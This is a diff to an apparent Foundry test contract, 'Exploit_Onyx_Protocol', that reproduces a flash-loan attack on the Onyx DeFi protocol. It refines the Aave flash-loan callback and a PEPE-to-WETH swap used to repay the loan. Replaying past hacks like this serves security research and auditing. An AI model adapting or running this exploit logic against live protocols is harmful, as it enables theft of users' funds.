@@ -112,11 +112,11 @@ contract Exploit_Onyx_Protocol is TestHarness, TokenBalanceTracker {
     }
 
     function executeOperation(
-        address asset,
+        address /* asset */,
         uint256 amount,
         uint256 premium,
-        address initiator,
-        bytes calldata params
+        address /* initiator */,
+        bytes calldata /* params */
     ) external returns (bool) {
         logBalancesWithLabel('Attacker contract', address(this));
         approveAll();
@@ -191,8 +191,8 @@ contract Exploit_Onyx_Protocol is TestHarness, TokenBalanceTracker {
 
             swapLinkToWeth(amountOut);
         }
-        
-        swapPepeToWeth();
+        // Swap some PEPE token to repay the loan
+        swapPepeToWeth(amount + premium - WETH.balanceOf(address(this)));
 
         WETH.approve(address(AaveV3), amount + premium);
 
@@ -281,12 +281,12 @@ contract Exploit_Onyx_Protocol is TestHarness, TokenBalanceTracker {
         );
     }
 
-    function swapPepeToWeth() internal {
+    function swapPepeToWeth(uint256 minAmount) internal {
         address[] memory path = new address[](2);
         path[0] = address(PEPE);
         path[1] = address(WETH);
         Router.swapExactTokensForTokens(
-            PEPE.balanceOf(address(this)), 3_950_619_005_376_690_920_220, path, address(this), block.timestamp + 3600
+            PEPE.balanceOf(address(this)), minAmount, path, address(this), block.timestamp + 3600
         );
     }
 
